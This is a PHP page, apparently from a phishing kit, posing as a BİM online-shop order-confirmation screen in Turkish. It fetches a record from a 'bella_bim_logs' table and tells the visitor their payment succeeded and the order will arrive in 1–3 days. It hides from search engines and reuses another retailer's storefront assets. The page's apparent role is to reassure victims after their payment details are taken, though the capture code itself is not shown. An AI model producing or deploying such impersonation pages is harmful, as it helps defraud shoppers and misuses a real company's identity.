<?php

// Include Helper
include_once('../inc/helper.php');

// Get the data from the request
$tID = htmlspecialchars(trim(strip_tags($_GET['t'])));

if (empty($tID)) {
    header('Location: index.php');
    exit;
}

$sql = "SELECT * FROM bella_bim_logs WHERE id = ?";
$query = $db->prepare($sql);
$stmt = $query->execute([$tID]);
$log = $query->fetch(PDO::FETCH_OBJ);

if (!$log) {
    header('Location: index.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="tr">
<head>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>Ödemeniz başarıyla tamamlandı</title>

    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',
        };
    </script>
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .container {
            max-width: 800px;
            margin: auto;
            padding: 0 20px;
        }

        .tick {
            font-size: 10rem;
            color: #39b54a;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        p {
            font-size: 2rem;
            margin-bottom: 2rem;
        }

        a {
            color: #39b54a;
            text-decoration: none;
            font-size: 2.8rem;
        }
    </style>

</head>
<body class="page-inner address">

<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="BİM">
                <img loading="lazy" src="bimex.png"
                     alt="">
            </a>
            <div class="clearfix"></div>
        </div>
    </header>

    <!-- Thanks Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top:10rem!important;">
            <div class="text-center">
                <div class="tick" style="margin-bottom: 50px!important;">&#10004;</div>
                <h1 style="margin-bottom: 1.5rem;">Siparişiniz için teşekkür ederiz!</h1>
                <p style="margin-bottom: 1.5rem;">Siparişiniz başarıyla alınmıştır.</h2>
                <p style="margin-top: 1.5rem;">Siparişinizin durumunu <a href="index.php"
                                                                         style="text-decoration: underline">hesabım</a>
                    sayfasından takip
                    edebilirsiniz.</p>
                    <p style="margin-top: 1.5rem;">Siparişiniz, yoğunluğa bağlı olarak 1-3 iş günü içerisinde adresinize ulaşacaktır.</p>
                <div class="text-center" style="margin-top: 50px;">
                    <a href="index.php">
                        <button class="btn btn-primary btn-lg" style="margin-top: 1.5rem;">Anasayfaya Dön</button>
                    </a>
                </div>
            </div>
        </div>
    </section>
    <!-- Thanks Section -->


    <footer class="page-checkout-footer hidden-xs">
        <p>2024 BİM Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>

<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
<script src="assets/js/bundle.js"></script>
<script src="assets/js/init.js" type="text/javascript"></script>
</body>
</html>